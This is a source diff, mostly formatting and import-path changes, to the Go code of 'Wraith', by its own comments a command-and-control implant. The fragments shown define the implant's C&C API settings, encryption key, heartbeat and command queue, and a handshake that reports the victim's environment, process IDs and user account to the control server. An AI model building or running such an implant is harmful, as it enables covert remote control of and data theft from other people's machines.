@@ -1,4 +1,3 @@
-// Package Name - main produces an executable
 package main
 
 // Dependencies
@@ -19,13 +18,13 @@ import (
 	"net/http"
 	"os"
 	"os/user"
+	"runtime"
 	"strings"
 	"sync"
-	"runtime"
 	"time"
 
-	yaegi "./include/yaegi/interp"
-	yaegi_stdlib "./include/yaegi/stdlib"
+	yaegi "github.com/traefik/yaegi"
+	yaegi_stdlib "github.com/traefik/yaegi/stdlib"
 )
 
 // Useful globals
@@ -122,19 +121,19 @@ func req(ReqType string, URL string, VerifySSL bool, DataType string, Data strin
 }
 
 type wraithStruct struct {
-	WraithID                 string     // ID of the Wraith assigned by the server
-	WraithStartTime          time.Time  // A copy of the Wraith start time
-	RunWraith                bool       // A flag controlling whether the Wraith should run
-	ControlAPIURL            string     // URL of the C&C server's API page
-	APIRequestPrefix         string     // The prefix to add to each API request
-	TrustedAPIFingerprint    string     // The fingerprint that must be supplied by API responses for them to be trusted
-	CryptKey                 string     // The encryption key to use to communicate with the API
-	HeartbeatDelay           uint64     // The delay between each successful heartbeat
-	HandshakeReattemptDelay  uint64     // The delay between handshake reattempts if the failed heartbeat tolerance is exceeded
-	FailedHeartbeatTolerance uint64     // How many failed handshakes in a row until the connection is reset
+	WraithID                 string    // ID of the Wraith assigned by the server
+	WraithStartTime          time.Time // A copy of the Wraith start time
+	RunWraith                bool      // A flag controlling whether the Wraith should run
+	ControlAPIURL            string    // URL of the C&C server's API page
+	APIRequestPrefix         string    // The prefix to add to each API request
+	TrustedAPIFingerprint    string    // The fingerprint that must be supplied by API responses for them to be trusted
+	CryptKey                 string    // The encryption key to use to communicate with the API
+	HeartbeatDelay           uint64    // The delay between each successful heartbeat
+	HandshakeReattemptDelay  uint64    // The delay between handshake reattempts if the failed heartbeat tolerance is exceeded
+	FailedHeartbeatTolerance uint64    // How many failed handshakes in a row until the connection is reset
 	//Plugins                  []string   // List of all plugins included with this Wraith
-	CommandQueue             []string   // A slice of the commands to be executed
-	CommandQueueMutex        sync.Mutex // A mutex preventing CommandQueue from being modified by multiple goroutines at the same time
+	CommandQueue      []string   // A slice of the commands to be executed
+	CommandQueueMutex sync.Mutex // A mutex preventing CommandQueue from being modified by multiple goroutines at the same time
 }
 
 func (wraith *wraithStruct) RefreshAPIURL() error {
@@ -432,21 +431,21 @@ func (wraith *wraithStruct) Handshake() error {
 			"reportedIP": "",
 		},
 		"wraithInfo": map[string]interface{}{
-			"version":     wraithVersion,
-			"startTime":   wraithStartTime,
-			"plugins":     "",
-			"env":         env,
-			"pid":         pid,
-			"ppid":        ppid,
+			"version":         wraithVersion,
+			"startTime":       wraithStartTime,
+			"plugins":         "",
+			"env":             env,
+			"pid":             pid,
+			"ppid":            ppid,
 			"runningUserName": runningUser.Name,
-			"runningUserID": runningUser.Uid,
+			"runningUserID":   runningUser.Uid,
 		},
 	}
 
 	// Send the data and receive the response
 	handshakeResult, handshakeErr := wraith.API(data)
 	if handshakeErr != nil {
-		return errors.New("error while completing handshake `"+fmt.Sprint(handshakeErr)+"`")
+		return errors.New("error while completing handshake `" + fmt.Sprint(handshakeErr) + "`")
 	}
 
 	// Set the Wraith parameters received in the handshake
